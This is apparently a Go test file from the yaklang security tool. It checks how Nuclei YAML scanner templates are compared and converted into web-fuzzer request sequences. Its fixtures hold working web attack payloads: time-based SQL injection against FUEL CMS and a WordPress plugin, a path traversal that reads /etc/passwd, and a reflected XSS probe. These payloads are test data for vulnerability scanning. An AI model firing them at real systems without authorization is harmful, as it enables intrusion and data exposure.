package yakgrpc

import (
	"context"
	"errors"
	"fmt"
	"github.com/yaklang/yaklang/common/utils"
	"github.com/yaklang/yaklang/common/yak/httptpl"
	"github.com/yaklang/yaklang/common/yakgrpc/ypb"
	"gopkg.in/yaml.v2"
	"testing"
)

func CompareNucleiYaml(yaml1, yaml2 string) error {
	temp1, err := httptpl.CreateYakTemplateFromNucleiTemplateRaw(yaml1)
	if err != nil {
		panic(err)
	}
	temp2, err := httptpl.CreateYakTemplateFromNucleiTemplateRaw(yaml2)
	if err != nil {
		panic(err)
	}
	if temp1 == nil || temp2 == nil {
		panic("create template failed")
	}
	// 比较签名
	if temp1.SignMainParams() != temp2.SignMainParams() {
		return errors.New("sign main params not equal")
	}

	// 比较其它字段
	yaml1Map := map[string]interface{}{}
	err = yaml.Unmarshal([]byte(yaml1), yaml1Map)
	if err != nil {
		panic(err)
	}
	yaml2Map := map[string]interface{}{}
	err = yaml.Unmarshal([]byte(yaml2), yaml2Map)
	if err != nil {
		panic(err)
	}
	for k, v := range yaml1Map {
		switch k {
		case "self-contained", `{{interactsh-url}}`, `{{interactsh}}`, `{{interactsh_url}}`, `interactsh`:
			if v != yaml2Map[k] {
				return errors.New(fmt.Sprintf("key %s not equal", k))
			}
		default:

		}
	}
	requests1 := utils.InterfaceToSliceInterface(utils.MapGetFirstRaw(yaml1Map, "requests", "http"))
	requests2 := utils.InterfaceToSliceInterface(utils.MapGetFirstRaw(yaml2Map, "requests", "http"))
	if len(requests1) != len(utils.InterfaceToSliceInterface(requests2)) {
		return errors.New("requests length not equal")
	}
	for i := 0; i < len(requests1); i++ {
		req1 := requests1[i].(map[any]any)
		req2 := requests2[i].(map[any]any)
		if len(req1) != len(req2) {
			return errors.New(fmt.Sprintf("request %d field length not equal", i+1))
		}
		for k, v := range req1 {
			switch k {
			case "stop-at-first-macth", "cookie-reuse", "max-size", "unsafe", "redirects", "max-redirects":
				if v != req2[k] {
					return errors.New(fmt.Sprintf("key %s not equal", k))
				}
			}
		}
	}
	return nil
}
func TestCompareNucleiYamlFunc(t *testing.T) {
	testCases := []struct {
		content string
		expect  string
		err     string
	}{
		{
			content: `http:
  - raw:
      - |
        GET /fuel/login/ HTTP/1.1
        Host: {{Hostname}}
      - |
        POST /fuel/login/ HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Referer: {{RootURL}}

        user_name={{username}}&password={{password}}&Login=Login&forward=
      - |
        @timeout: 10s
        GET /fuel/pages/items/?search_term=&published=&layout=&limit=50&view_type=list&offset=0&order=asc&col=location+AND+(SELECT+1340+FROM+(SELECT(SLEEP(6)))ULQV)&fuel_inline=0 HTTP/1.1
        Host: {{Hostname}}
        X-Requested-With: XMLHttpRequest
        Referer: {{RootURL}}

    payloads:
      username:
        - admin
      password:
        - admin
    attack: pitchfork
    cookie-reuse: true
    matchers:
      - type: dsl
        dsl:
          - 'duration>=6'
          - 'status_code_3 == 200'
          - 'contains(body_1, "FUEL CMS")'
        condition: and`,
			expect: `http:
  - raw:
      - |
        GET /fuel/login/ HTTP/1.1
        Host: {{Hostname}}
      - |
        POST /fuel/login/ HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Referer: {{RootURL}}

        user_name={{username}}&password={{password}}&Login=Login&forward=
      - |
        @timeout: 10s
        GET /fuel/pages/items/?search_term=&published=&layout=&limit=50&view_type=list&offset=0&order=asc&col=location+AND+(SELECT+1340+FROM+(SELECT(SLEEP(6)))ULQV)&fuel_inline=0 HTTP/1.1
        Host: {{Hostname}}
        X-Requested-With: XMLHttpRequest
        Referer: {{RootURL}}

    payloads:
      username:
        - admin
      password:
        - admin
    attack: pitchfork
    cookie-reuse: true
    matchers:
      - type: dsl
        dsl:
          - 'duration>=6'
          - 'status_code_3 == 200'
          - 'contains(body_1, "FUEL CMS")'
        condition: and`,
			err: "",
		}, {
			content: `http:
  - raw:
      - |
        GET /fuel/login/ HTTP/1.1
        Host: {{Hostname}}
      - |
        POST /fuel/login/ HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Referer: {{RootURL}}

        user_name={{username}}&password={{password}}&Login=Login&forward=
      - |
        @timeout: 10s
        GET /fuel/pages/items/?search_term=&published=&layout=&limit=50&view_type=list&offset=0&order=asc&col=location+AND+(SELECT+1340+FROM+(SELECT(SLEEP(6)))ULQV)&fuel_inline=0 HTTP/1.1
        Host: {{Hostname}}
        X-Requested-With: XMLHttpRequest
        Referer: {{RootURL}}

    payloads:
      username:
        - admin
      password:
        - admin
    attack: pitchfork
    cookie-reuse: true
    redirects: true
    max-redirects: 10
    matchers:
      - type: dsl
        dsl:
          - 'duration>=6'
          - 'status_code_3 == 200'
          - 'contains(body_1, "FUEL CMS")'
        condition: and`,
			expect: `http:
  - raw:
      - |
        GET /fuel/login/ HTTP/1.1
        Host: {{Hostname}}
      - |
        POST /fuel/login/ HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Referer: {{RootURL}}

        user_name={{username}}&password={{password}}&Login=Login&forward=
      - |
        @timeout: 10s
        GET /fuel/pages/items/?search_term=&published=&layout=&limit=50&view_type=list&offset=0&order=asc&col=location+AND+(SELECT+1340+FROM+(SELECT(SLEEP(6)))ULQV)&fuel_inline=0 HTTP/1.1
        Host: {{Hostname}}
        X-Requested-With: XMLHttpRequest
        Referer: {{RootURL}}

    payloads:
      username:
        - admin
      password:
        - admin
    attack: pitchfork
    cookie-reuse: true
    matchers:
      - type: dsl
        dsl:
          - 'duration>=6'
          - 'status_code_3 == 200'
          - 'contains(body_1, "FUEL CMS")'
        condition: and`,
			err: "request 1 field length not equal",
		}, {
			content: `http:
  - raw:
      - |
        GET /fuel/login/ HTTP/1.1
        Host: {{Hostname}}
      - |
        POST /fuel/login/ HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Referer: {{RootURL}}

        user_name={{username}}&password={{password}}&Login=Login&forward=
      - |
        @timeout: 10s
        GET /fuel/pages/items/?search_term=&published=&layout=&limit=50&view_type=list&offset=0&order=asc&col=location+AND+(SELECT+1340+FROM+(SELECT(SLEEP(6)))ULQV)&fuel_inline=0 HTTP/1.1
        Host: {{Hostname}}
        X-Requested-With: XMLHttpRequest
        Referer: {{RootURL}}

    payloads:
      username:
        - admin
      password:
        - admin
    attack: pitchfork
    cookie-reuse: true
    redirects: true
    max-redirects: 10
    matchers:
      - type: dsl
        dsl:
          - 'duration>=6'
          - 'status_code_3 == 200'
          - 'contains(body_1, "FUEL CMS")'
        condition: and`,
			expect: `http:
  - raw:
      - |
        GET /fuel/login/ HTTP/1.1
        Host: {{Hostname}}
      - |
        POST /fuel/login/ HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Referer: {{RootURL}}

        user_name={{username}}&password={{password}}&Login=Login&forward=
      - |
        @timeout: 10s
        GET /fuel/pages/items/?search_term=&published=&layout=&limit=50&view_type=list&offset=0&order=asc&col=location+AND+(SELECT+1340+FROM+(SELECT(SLEEP(6)))ULQV)&fuel_inline=0 HTTP/1.1
        Host: {{Hostname}}
        X-Requested-With: XMLHttpRequest
        Referer: {{RootURL}}

    payloads:
      username:
        - admina
      password:
        - admin
    attack: pitchfork
    cookie-reuse: true
    redirects: true
    max-redirects: 10
    matchers:
      - type: dsl
        dsl:
          - 'duration>=6'
          - 'status_code_3 == 200'
          - 'contains(body_1, "FUEL CMS")'
        condition: and`,
			err: "sign main params not equal",
		}}
	for _, testCase := range testCases {
		err := CompareNucleiYaml(testCase.content, testCase.expect)
		if err != nil {
			if err.Error() != testCase.err {
				t.Fatal(fmt.Sprintf("expect error: %s, got: %s", testCase.err, err.Error()))
			}
		} else {
			if testCase.err != "" {
				t.Fatal(fmt.Sprintf("expect error: %s, got: nil", testCase.err))
			}
		}
	}
}
func TestGRPCMUSTPASS_WebFuzzerSequenceConvertYaml(t *testing.T) {
	client, err := NewLocalClient()
	if err != nil {
		t.Fatal(err)
	}
	testCases := []struct {
		content string
		expect  string
		err     string
	}{
		{ // 一个请求节点包含两个请求，预期解析为两个请求节点
			content: `http:
  - raw:
      - |
        POST /wp-login.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        log={{username}}&pwd={{password}}&wp-submit=Log+In

      - |
        @timeout: 10s
        POST /wp-admin/admin-ajax.php HTTP/1.1
        Host: {{Hostname}}
        content-type: application/x-www-form-urlencoded

        action=parse-media-shortcode&shortcode=[wptripadvisor_usetemplate+tid="1+AND+(SELECT+42+FROM+(SELECT(SLEEP(6)))b)"]

    cookie-reuse: true
    matchers:
      - type: dsl
        dsl:
          - 'duration_2>=6'
          - 'status_code_2 == 200'
          - 'contains(content_type_2, "application/json")'
          - 'contains(body_2, "\"data\":{")'
        condition: and
`,
			expect: `http:
  - raw:
      - |
        POST /wp-login.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        log={{username}}&pwd={{password}}&wp-submit=Log+In
    cookie-reuse: true
    matchers:
      - type: dsl
        dsl:
          - 'duration_2>=6'
          - 'status_code_2 == 200'
          - 'contains(content_type_2, "application/json")'
          - 'contains(body_2, "\"data\":{")'
        condition: and
  - raw:      
      - |
        @timeout: 10s
        POST /wp-admin/admin-ajax.php HTTP/1.1
        Host: {{Hostname}}
        content-type: application/x-www-form-urlencoded

        action=parse-media-shortcode&shortcode=[wptripadvisor_usetemplate+tid="1+AND+(SELECT+42+FROM+(SELECT(SLEEP(6)))b)"]
    cookie-reuse: true
    matchers:
      - type: dsl
        dsl:
          - 'duration_2>=6'
          - 'status_code_2 == 200'
          - 'contains(content_type_2, "application/json")'
          - 'contains(body_2, "\"data\":{")'
        condition: and
`,
		},
		{ // path请求，预期解析为raw请求，匹配器不变
			content: `http:
  - method: GET
    path:
      - '{{BaseURL}}/images//////////////////../../../../../../../../etc/passwd'

    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "root:[x*]:0:0"

      - type: word
        part: header
        words:
          - content/unknown

      - type: status
        status:
          - 200`,
			expect: `http:
  - raw:
    - |+
      GET {{PathTrimEndSlash}}/images//////////////////../../../../../../../../etc/passwd HTTP/1.1
      Host: {{Hostname}}
      User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0

    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "root:[x*]:0:0"

      - type: word
        part: header
        words:
          - content/unknown

      - type: status
        status:
          - 200
`,
		},
		{ // 一些配置
			content: `http:
  - raw:
      - |
        POST /search-locker-details.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        searchinput=%E2%80%9C%2F%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&submit=

    cookie-reuse: true
    redirects: true
    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'contains(body, "/><script>alert(document.domain)</script>")'
          - 'contains(body, "Bank Locker Management System")'
        condition: and`,
			expect: `http:
  - raw:
      - |
        POST /search-locker-details.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        searchinput=%E2%80%9C%2F%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&submit=

    cookie-reuse: true
    redirects: true
    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'contains(body, "/><script>alert(document.domain)</script>")'
          - 'contains(body, "Bank Locker Management System")'
        condition: and`,
		},
		{ // 包含payload等其它配置，验证生成配置完整且有序
			content: `http:
  - raw:
      - |
        GET /fuel/login/ HTTP/1.1
        Host: {{Hostname}}
      - |
        POST /fuel/login/ HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Referer: {{RootURL}}

        user_name={{username}}&password={{password}}&Login=Login&forward=
      - |
        @timeout: 10s
        GET /fuel/pages/items/?search_term=&published=&layout=&limit=50&view_type=list&offset=0&order=asc&col=location+AND+(SELECT+1340+FROM+(SELECT(SLEEP(6)))ULQV)&fuel_inline=0 HTTP/1.1
        Host: {{Hostname}}
        X-Requested-With: XMLHttpRequest
        Referer: {{RootURL}}

    payloads:
      username:
        - admin
      password:
        - admin
    attack: pitchfork
    cookie-reuse: true
    matchers:
      - type: dsl
        dsl:
          - 'duration>=6'
          - 'status_code_3 == 200'
          - 'contains(body_1, "FUEL CMS")'
        condition: and`,
			expect: `http:
  - raw:
      - |
        GET /fuel/login/ HTTP/1.1
        Host: {{Hostname}}
    payloads:
      username:
        - admin
      password:
        - admin
    cookie-reuse: true
    matchers:
      - type: dsl
        dsl:
          - 'duration>=6'
          - 'status_code_3 == 200'
          - 'contains(body_1, "FUEL CMS")'
        condition: and
  - raw:
      - |
        POST /fuel/login/ HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Referer: {{RootURL}}

        user_name={{username}}&password={{password}}&Login=Login&forward=

    payloads:
      username:
        - admin
      password:
        - admin
    cookie-reuse: true
    matchers:
      - type: dsl
        dsl:
          - 'duration>=6'
          - 'status_code_3 == 200'
          - 'contains(body_1, "FUEL CMS")'
        condition: and
  - raw:
      - |
        @timeout: 10s
        GET /fuel/pages/items/?search_term=&published=&layout=&limit=50&view_type=list&offset=0&order=asc&col=location+AND+(SELECT+1340+FROM+(SELECT(SLEEP(6)))ULQV)&fuel_inline=0 HTTP/1.1
        Host: {{Hostname}}
        X-Requested-With: XMLHttpRequest
        Referer: {{RootURL}}
    payloads:
      username:
        - admin
      password:
        - admin
    cookie-reuse: true
    matchers:
      - type: dsl
        dsl:
          - 'duration>=6'
          - 'status_code_3 == 200'
          - 'contains(body_1, "FUEL CMS")'
        condition: and`,
		},
	}
	for i, testCase := range testCases {
		if i < 1 {
			continue
		}
		rsp, err := client.ImportHTTPFuzzerTaskFromYaml(context.Background(), &ypb.ImportHTTPFuzzerTaskFromYamlRequest{
			YamlContent: testCase.content,
		})
		if err != nil {
			t.Fatal(err)
		}
		res, err := client.ExportHTTPFuzzerTaskToYaml(context.Background(), &ypb.ExportHTTPFuzzerTaskToYamlRequest{
			Requests: rsp.Requests,
		})

		if err := CompareNucleiYaml(res.YamlContent, testCase.expect); err != nil {
			t.Fatal(err)
		}
	}
}
